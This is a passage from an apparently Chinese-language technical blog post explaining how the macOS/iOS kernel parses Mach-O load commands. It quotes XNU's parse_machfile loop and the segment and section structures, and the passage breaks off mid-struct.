<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> load_command &#123;</span><br><span class="line">	<span class="keyword">uint32_t</span> cmd;		<span class="comment">/* type of load command */</span></span><br><span class="line">	<span class="keyword">uint32_t</span> cmdsize;	<span class="comment">/* total size of command in bytes */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>Load Commands 直接就跟在Header后面，所有command占用内存的<strong>总和</strong>在Mach-O Header里面已经给出了。在加载过Header之后就是通过解析LoadCommand来加载接下来的数据了。我简单的看了一下内核中是如何解析macho数据的，抛开内核的实现细节，逻辑其实也十分简单。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span></span><br><span class="line">load_return_t</span><br><span class="line"><span class="title">parse_machfile</span><span class="params">(</span><br><span class="line">	<span class="keyword">struct</span> vnode 		*vp,       </span><br><span class="line">	vm_map_t		<span class="built_in">map</span>,</span><br><span class="line">	thread_t		thread,</span><br><span class="line">	<span class="keyword">struct</span> mach_header	*header,</span><br><span class="line">	off_t			file_offset,</span><br><span class="line">	off_t			macho_size,</span><br><span class="line">	<span class="keyword">int</span>			depth,</span><br><span class="line">	int64_t			aslr_offset,</span><br><span class="line">	int64_t			dyld_aslr_offset,</span><br><span class="line">	load_result_t		*result</span><br><span class="line">)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	[...] <span class="comment">//此处省略大量初始化与检测</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span><br><span class="line">		 * Loop through each of the load_commands indicated by the</span><br><span class="line">		 * Mach-O header; if an absurd value is provided, we just</span><br><span class="line">		 * run off the end of the reserved section by incrementing</span><br><span class="line">		 * the offset too far, so we are implicitly fail-safe.</span><br><span class="line">		 */</span></span><br><span class="line">		offset = mach_header_sz;</span><br><span class="line">		ncmds = header-&gt;ncmds;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (ncmds--) &#123;</span><br><span class="line">			<span class="comment">/*</span><br><span class="line">			 *	Get a pointer to the command.</span><br><span class="line">			 */</span></span><br><span class="line">			lcp = (<span class="keyword">struct</span> load_command *)(addr + offset);</span><br><span class="line">			<span class="comment">//lcp设为当前要解析的cmd的地址</span></span><br><span class="line">			oldoffset = offset;</span><br><span class="line">			<span class="comment">//oldoffset是从macho文件内存开始的地方偏移到当前command的偏移量</span></span><br><span class="line">			offset += lcp-&gt;cmdsize;</span><br><span class="line">			<span class="comment">//重新计算offset，再加上当前command的长度，offset的值为文件内存起始地址到下一个command的偏移量</span></span><br><span class="line">			<span class="comment">/*</span><br><span class="line">			 * Perform prevalidation of the struct load_command</span><br><span class="line">			 * before we attempt to use its contents.  Invalid</span><br><span class="line">			 * values are ones which result in an overflow, or</span><br><span class="line">			 * which can not possibly be valid commands, or which</span><br><span class="line">			 * straddle or exist past the reserved section at the</span><br><span class="line">			 * start of the image.</span><br><span class="line">			 */</span></span><br><span class="line">			<span class="keyword">if</span> (oldoffset &gt; offset ||</span><br><span class="line">			    lcp-&gt;cmdsize &lt; <span class="keyword">sizeof</span>(<span class="keyword">struct</span> load_command) ||</span><br><span class="line">			    offset &gt; header-&gt;sizeofcmds + mach_header_sz) &#123;</span><br><span class="line">				ret = LOAD_BADMACHO;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">//做了一个检测，与如何加载进入内存无关</span></span><br><span class="line"></span><br><span class="line">			<span class="comment">/*</span><br><span class="line">			 * Act on struct load_command's for which kernel</span><br><span class="line">			 * intervention is required.</span><br><span class="line">			 */</span></span><br><span class="line">			<span class="keyword">switch</span>(lcp-&gt;cmd) &#123;</span><br><span class="line">			<span class="keyword">case</span> LC_SEGMENT:</span><br><span class="line">				[...]</span><br><span class="line">				ret = load_segment(lcp,</span><br><span class="line">				                   header-&gt;filetype,</span><br><span class="line">				                   control,</span><br><span class="line">				                   file_offset,</span><br><span class="line">				                   macho_size,</span><br><span class="line">				                   vp,</span><br><span class="line">				                   <span class="built_in">map</span>,</span><br><span class="line">				                   slide,</span><br><span class="line">				                   result);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_SEGMENT_64:</span><br><span class="line">				[...]</span><br><span class="line">				ret = load_segment(lcp,</span><br><span class="line">				                   header-&gt;filetype,</span><br><span class="line">				                   control,</span><br><span class="line">				                   file_offset,</span><br><span class="line">				                   macho_size,</span><br><span class="line">				                   vp,</span><br><span class="line">				                   <span class="built_in">map</span>,</span><br><span class="line">				                   slide,</span><br><span class="line">				                   result);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_UNIXTHREAD:</span><br><span class="line">				<span class="keyword">if</span> (pass != <span class="number">1</span>)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				ret = load_unixthread(</span><br><span class="line">						 (<span class="keyword">struct</span> thread_command *) lcp,</span><br><span class="line">						 thread,</span><br><span class="line">						 slide,</span><br><span class="line">						 result);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_MAIN:</span><br><span class="line">				<span class="keyword">if</span> (pass != <span class="number">1</span>)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">if</span> (depth != <span class="number">1</span>)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				ret = load_main(</span><br><span class="line">						 (<span class="keyword">struct</span> entry_point_command *) lcp,</span><br><span class="line">						 thread,</span><br><span class="line">						 slide,</span><br><span class="line">						 result);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_LOAD_DYLINKER:</span><br><span class="line">				<span class="keyword">if</span> (pass != <span class="number">3</span>)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">if</span> ((depth == <span class="number">1</span>) &amp;&amp; (dlp == <span class="number">0</span>)) &#123;</span><br><span class="line">					dlp = (<span class="keyword">struct</span> dylinker_command *)lcp;</span><br><span class="line">					dlarchbits = (header-&gt;cputype &amp; CPU_ARCH_MASK);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					ret = LOAD_FAILURE;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_UUID:</span><br><span class="line">				<span class="keyword">if</span> (pass == <span class="number">1</span> &amp;&amp; depth == <span class="number">1</span>) &#123;</span><br><span class="line">					ret = load_uuid((<span class="keyword">struct</span> uuid_command *) lcp,</span><br><span class="line">							(<span class="keyword">char</span> *)addr + mach_header_sz + header-&gt;sizeofcmds,</span><br><span class="line">							result);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_CODE_SIGNATURE:</span><br><span class="line">				[...]</span><br><span class="line">				ret = load_code_signature(</span><br><span class="line">					(<span class="keyword">struct</span> linkedit_data_command *) lcp,</span><br><span class="line">					vp,</span><br><span class="line">					file_offset,</span><br><span class="line">					macho_size,</span><br><span class="line">					header-&gt;cputype,</span><br><span class="line">					result);</span><br><span class="line">				[...]</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> CONFIG_CODE_DECRYPTION</span></span><br><span class="line">			<span class="keyword">case</span> LC_ENCRYPTION_INFO:</span><br><span class="line">			<span class="keyword">case</span> LC_ENCRYPTION_INFO_64:</span><br><span class="line">				<span class="keyword">if</span> (pass != <span class="number">3</span>)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				ret = set_code_unprotect(</span><br><span class="line">					(<span class="keyword">struct</span> encryption_info_command *) lcp,</span><br><span class="line">					addr, <span class="built_in">map</span>, slide, vp, file_offset,</span><br><span class="line">					header-&gt;cputype, header-&gt;cpusubtype);</span><br><span class="line">				<span class="keyword">if</span> (ret != LOAD_SUCCESS) &#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">"proc %d: set_code_unprotect() error %d "</span></span><br><span class="line">					       <span class="string">"for file \"%s\"\n"</span>,</span><br><span class="line">					       p-&gt;p_pid, ret, vp-&gt;v_name);</span><br><span class="line">					<span class="comment">/* </span><br><span class="line">					 * Don't let the app run if it's </span><br><span class="line">					 * encrypted but we failed to set up the</span><br><span class="line">					 * decrypter. If the keys are missing it will</span><br><span class="line">					 * return LOAD_DECRYPTFAIL.</span><br><span class="line">					 */</span></span><br><span class="line">					 <span class="keyword">if</span> (ret == LOAD_DECRYPTFAIL) &#123;</span><br><span class="line">						<span class="comment">/* failed to load due to missing FP keys */</span></span><br><span class="line">						proc_lock(p);</span><br><span class="line">						p-&gt;p_lflag |= P_LTERM_DECRYPTFAIL;</span><br><span class="line">						proc_unlock(p);</span><br><span class="line">					 &#125;</span><br><span class="line">					 psignal(p, SIGKILL);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="comment">/* Other commands are ignored by the kernel */</span></span><br><span class="line">				ret = LOAD_SUCCESS;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (ret != LOAD_SUCCESS)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (ret != LOAD_SUCCESS)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	[...] <span class="comment">//此处略去加载之后的处理代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-1cmdsize字段">3.1cmdsize字段</h3><p>这里主要看while循环刚刚进入的时候几行代码,来理解是如何通过load_command的cmd字段来解析Macho文件的数据。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">lcp = (<span class="keyword">struct</span> load_command *)(addr + offset);</span><br><span class="line"><span class="comment">//lcp设为当前要解析的cmd的地址</span></span><br><span class="line">oldoffset = offset;</span><br><span class="line"><span class="comment">//oldoffset是从macho文件内存开始的地方偏移到当前command的偏移量</span></span><br><span class="line">offset += lcp-&gt;cmdsize;</span><br><span class="line"><span class="comment">//重新计算offset，再加上当前command的长度，offset的值为文件内存起始地址到下一个command的偏移量</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h3 id="3-2_cmd字段">3.2 cmd字段</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(lcp-&gt;cmd) &#123;</span><br><span class="line">			<span class="keyword">case</span> LC_SEGMENT:</span><br><span class="line">				[...]</span><br><span class="line">				ret = load_segment(lcp,</span><br><span class="line">				                   header-&gt;filetype,</span><br><span class="line">				                   control,</span><br><span class="line">				                   file_offset,</span><br><span class="line">				                   macho_size,</span><br><span class="line">				                   vp,</span><br><span class="line">				                   <span class="built_in">map</span>,</span><br><span class="line">				                   slide,</span><br><span class="line">				                   result);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_SEGMENT_64:</span><br><span class="line">				[...]</span><br><span class="line">				ret = load_segment(lcp,</span><br><span class="line">				                   header-&gt;filetype,</span><br><span class="line">				                   control,</span><br><span class="line">				                   file_offset,</span><br><span class="line">				                   macho_size,</span><br><span class="line">				                   vp,</span><br><span class="line">				                   <span class="built_in">map</span>,</span><br><span class="line">				                   slide,</span><br><span class="line">				                   result);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_UNIXTHREAD:</span><br><span class="line">				<span class="keyword">if</span> (pass != <span class="number">1</span>)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				ret = load_unixthread(</span><br><span class="line">						 (<span class="keyword">struct</span> thread_command *) lcp,</span><br><span class="line">						 thread,</span><br><span class="line">						 slide,</span><br><span class="line">						 result);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_MAIN:</span><br><span class="line">				<span class="keyword">if</span> (pass != <span class="number">1</span>)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">if</span> (depth != <span class="number">1</span>)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				ret = load_main(</span><br><span class="line">						 (<span class="keyword">struct</span> entry_point_command *) lcp,</span><br><span class="line">						 thread,</span><br><span class="line">						 slide,</span><br><span class="line">						 result);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_LOAD_DYLINKER:</span><br><span class="line">				<span class="keyword">if</span> (pass != <span class="number">3</span>)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">if</span> ((depth == <span class="number">1</span>) &amp;&amp; (dlp == <span class="number">0</span>)) &#123;</span><br><span class="line">					dlp = (<span class="keyword">struct</span> dylinker_command *)lcp;</span><br><span class="line">					dlarchbits = (header-&gt;cputype &amp; CPU_ARCH_MASK);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					ret = LOAD_FAILURE;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_UUID:</span><br><span class="line">				<span class="keyword">if</span> (pass == <span class="number">1</span> &amp;&amp; depth == <span class="number">1</span>) &#123;</span><br><span class="line">					ret = load_uuid((<span class="keyword">struct</span> uuid_command *) lcp,</span><br><span class="line">							(<span class="keyword">char</span> *)addr + mach_header_sz + header-&gt;sizeofcmds,</span><br><span class="line">							result);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_CODE_SIGNATURE:</span><br><span class="line">				[...]</span><br><span class="line">				ret = load_code_signature(</span><br><span class="line">					(<span class="keyword">struct</span> linkedit_data_command *) lcp,</span><br><span class="line">					vp,</span><br><span class="line">					file_offset,</span><br><span class="line">					macho_size,</span><br><span class="line">					header-&gt;cputype,</span><br><span class="line">					result);</span><br><span class="line">				[...]</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> CONFIG_CODE_DECRYPTION</span></span><br><span class="line">			<span class="keyword">case</span> LC_ENCRYPTION_INFO:</span><br><span class="line">			<span class="keyword">case</span> LC_ENCRYPTION_INFO_64:</span><br><span class="line">				<span class="keyword">if</span> (pass != <span class="number">3</span>)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				ret = set_code_unprotect(</span><br><span class="line">					(<span class="keyword">struct</span> encryption_info_command *) lcp,</span><br><span class="line">					addr, <span class="built_in">map</span>, slide, vp, file_offset,</span><br><span class="line">					header-&gt;cputype, header-&gt;cpusubtype);</span><br><span class="line">				<span class="keyword">if</span> (ret != LOAD_SUCCESS) &#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">"proc %d: set_code_unprotect() error %d "</span></span><br><span class="line">					       <span class="string">"for file \"%s\"\n"</span>,</span><br><span class="line">					       p-&gt;p_pid, ret, vp-&gt;v_name);</span><br><span class="line">					<span class="comment">/* </span><br><span class="line">					 * Don't let the app run if it's </span><br><span class="line">					 * encrypted but we failed to set up the</span><br><span class="line">					 * decrypter. If the keys are missing it will</span><br><span class="line">					 * return LOAD_DECRYPTFAIL.</span><br><span class="line">					 */</span></span><br><span class="line">					 <span class="keyword">if</span> (ret == LOAD_DECRYPTFAIL) &#123;</span><br><span class="line">						<span class="comment">/* failed to load due to missing FP keys */</span></span><br><span class="line">						proc_lock(p);</span><br><span class="line">						p-&gt;p_lflag |= P_LTERM_DECRYPTFAIL;</span><br><span class="line">						proc_unlock(p);</span><br><span class="line">					 &#125;</span><br><span class="line">					 psignal(p, SIGKILL);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="comment">/* Other commands are ignored by the kernel */</span></span><br><span class="line">				ret = LOAD_SUCCESS;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>
<p>从这一段代码可以看出，根据cmd字段的类型不同，使用了不同的函数来加载。简单的列出一张表看一看在内核代码中不同的command类型都有哪些作用。</p>
<table>
<thead>
<tr>
<th>Command类型</th>
<th style="text-align:left">处理函数</th>
<th style="text-align:left">用途</th>
</tr>
</thead>
<tbody>
<tr>
<td>LC_SEGMENT；LC_SEGMENT_64</td>
<td style="text-align:left">load_segment</td>
<td style="text-align:left">将segment中的数据加载并映射到进程的内存空间去</td>
</tr>
<tr>
<td>LC_LOAD_DYLINKER</td>
<td style="text-align:left">load_dylinker</td>
<td style="text-align:left">调用/usr/lib/dyld程序</td>
</tr>
<tr>
<td>LC_UUID</td>
<td style="text-align:left">load_uuid</td>
<td style="text-align:left">加载128-bit的唯一ID</td>
</tr>
<tr>
<td>LC_THREAD</td>
<td style="text-align:left">load_thread</td>
<td style="text-align:left">开启一个MACH线程，但是不分配栈空间。</td>
</tr>
<tr>
<td>LC_UNIXTHREAD</td>
<td style="text-align:left">load_unixthread</td>
<td style="text-align:left">开启一个UNIX线程</td>
</tr>
<tr>
<td>LC_CODE_SIGNATURE</td>
<td style="text-align:left">load_code_signature</td>
<td style="text-align:left">进行数字签名</td>
</tr>
<tr>
<td>LC_ENCRYPTION_INFO</td>
<td style="text-align:left">set_code_unprotect</td>
<td style="text-align:left">加密二进制文件</td>
</tr>
</tbody>
</table>
<h1 id="0x04_Segment&amp;Section">0x04 Segment&amp;Section</h1><p>加载数据时，主要加载的就是LC_SEGMET活着LC_SEGMENT_64。其他的Segment的用途在上一节已经简单的介绍了，这里不做深究。</p>
<p>LCSEGMENT以及LC_SEGMENT_64的数据结构是这样的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">struct</span> segment_command &#123; <span class="comment">/* for 32-bit architectures */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	cmd;		<span class="comment">/* LC_SEGMENT */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	cmdsize;	<span class="comment">/* includes sizeof section structs */</span></span><br><span class="line">	<span class="keyword">char</span>		segname[<span class="number">16</span>];	<span class="comment">/* segment name */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	vmaddr;		<span class="comment">/* memory address of this segment */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	vmsize;		<span class="comment">/* memory size of this segment */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	fileoff;	<span class="comment">/* file offset of this segment */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	filesize;	<span class="comment">/* amount to map from the file */</span></span><br><span class="line">	<span class="keyword">vm_prot_t</span>	maxprot;	<span class="comment">/* maximum VM protection */</span></span><br><span class="line">	<span class="keyword">vm_prot_t</span>	initprot;	<span class="comment">/* initial VM protection */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	nsects;		<span class="comment">/* number of sections in segment */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	flags;		<span class="comment">/* flags */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> segment_command_64 &#123; <span class="comment">/* for 64-bit architectures */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	cmd;		<span class="comment">/* LC_SEGMENT_64 */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	cmdsize;	<span class="comment">/* includes sizeof section_64 structs */</span></span><br><span class="line">	<span class="keyword">char</span>		segname[<span class="number">16</span>];	<span class="comment">/* segment name */</span></span><br><span class="line">	<span class="keyword">uint64_t</span>	vmaddr;		<span class="comment">/* memory address of this segment */</span></span><br><span class="line">	<span class="keyword">uint64_t</span>	vmsize;		<span class="comment">/* memory size of this segment */</span></span><br><span class="line">	<span class="keyword">uint64_t</span>	fileoff;	<span class="comment">/* file offset of this segment */</span></span><br><span class="line">	<span class="keyword">uint64_t</span>	filesize;	<span class="comment">/* amount to map from the file */</span></span><br><span class="line">	<span class="keyword">vm_prot_t</span>	maxprot;	<span class="comment">/* maximum VM protection */</span></span><br><span class="line">	<span class="keyword">vm_prot_t</span>	initprot;	<span class="comment">/* initial VM protection */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	nsects;		<span class="comment">/* number of sections in segment */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	flags;		<span class="comment">/* flags */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>可以看出，这里大部分的数据是用来帮助内核将Segment映射到虚拟内存的。主要要关注的是<code>nsects</code></p>
<p>字段，标示了Segment中有多少secetion。section是具体有用的数据存放的地方。</p>
<p>Section的数据结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> section &#123; <span class="comment">/* for 32-bit architectures */</span></span><br><span class="line">	<span class="keyword">char</span>		sectname[<span class="number">16</span>];	<span class="comment">/* name of this section */</span></span><br><span class="line">	<span class="keyword">char</span>		segname[<span class="number">16</span>];	<span class="comment">/* segment this section goes in */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	addr;		<span class="comment">/* memory address of this section */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	size;		<span class="comment">/* size in bytes of this section */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	offset;		<span class="comment">/* file offset of this section */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	align;		<span class="comment">/* section alignment (power of 2) */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	reloff;		<span class="comment">/* file offset of relocation entries */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	nreloc;		<span 